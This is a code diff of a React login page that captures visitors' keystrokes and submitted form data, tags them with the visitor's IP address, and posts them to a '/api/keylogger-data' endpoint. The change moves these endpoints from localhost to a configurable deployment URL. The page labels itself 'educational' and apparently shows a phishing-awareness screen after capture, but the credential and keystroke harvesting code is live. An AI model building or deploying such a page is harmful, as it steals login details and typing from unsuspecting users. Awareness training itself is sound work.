@@ -3,7 +3,9 @@ import icon from "./assets/icon.svg"
 import side from "./assets/sidelogin.webp";
 import { useState, useEffect } from "react";
 import axios from "axios";
-
+const API_URL = import.meta.env.VITE_API_URL;
+const TURNSTILE_KEY = import.meta.env.VITE_TURNSTILE_KEY;
+const IPIFY_URL = import.meta.env.VITE_IPIFY_URL;
 function App() {
   const [formData, setFormData] = useState({
     email: "",
@@ -63,7 +65,7 @@ function App() {
     };
 
     try {
-      await axios.post('http://localhost:3001/api/keylogger-data', keylogData);
+      await axios.post(`${API_URL}/api/keylogger-data`, keylogData);
       console.log('🔑 Keystrokes captured:', keystrokes);
     } catch (error) {
       console.error('Error sending keylog data:', error);
@@ -109,7 +111,7 @@ function App() {
     };
 
     try {
-      await axios.post('http://localhost:3001/api/educational-log', educationalData);
+      await axios.post(`${API_URL}/api/educational-log`, educationalData);
       
       const formCaptureData = {
         type: 'FORM_DATA_CAPTURE',
@@ -120,7 +122,7 @@ function App() {
         ip: await getIP()
       };
 
-      await axios.post('http://localhost:3001/api/keylogger-data', formCaptureData);
+      await axios.post(`${API_URL}/api/keylogger-data`, formCaptureData);
       
       setShowEducational(true);
     } catch (error) {
@@ -132,7 +134,7 @@ function App() {
 
   const getIP = async () => {
     try {
-      const response = await axios.get('https://api.ipify.org?format=json');
+      const response = await axios.get(IPIFY_URL);
       return response.data.ip;
     } catch (error) {
       return 'unknown';
@@ -229,7 +231,7 @@ function App() {
             <div className="flex justify-center py-2">
               <div 
                 className="cf-turnstile" 
-                data-sitekey="1x00000000000000000000AA"
+                data-sitekey={TURNSTILE_KEY}
                 data-callback="onTurnstileCallback"
                 data-theme="dark"
               />
